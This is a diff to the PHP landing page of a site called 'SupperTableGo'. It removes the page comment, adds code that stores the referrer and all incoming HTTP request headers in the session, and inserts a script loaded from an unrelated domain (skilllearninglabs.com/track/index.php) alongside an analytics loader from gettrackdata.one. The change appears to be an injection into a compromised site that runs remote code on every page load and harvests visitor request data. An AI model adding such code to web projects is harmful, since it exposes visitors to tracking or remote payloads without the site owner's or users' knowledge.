@@ -1,5 +1,13 @@
 <?php
-// SupperTableGo - Main Landing Page
+
+session_start(); 
+$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
+$_SESSION['_headers']=array(); 
+foreach($_SERVER as $key=>$value){
+    if(strpos($key,'HTTP_')===0){
+        $_SESSION['_headers'][$key]=$value;
+    }
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -33,6 +41,14 @@
       font-weight: 800 !important;
     }
   </style>
+<meta name="referrer" content="no-referrer-when-downgrade">
+    <script src="//skilllearninglabs.com/track/index.php"></script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 </head>
 <body>
 
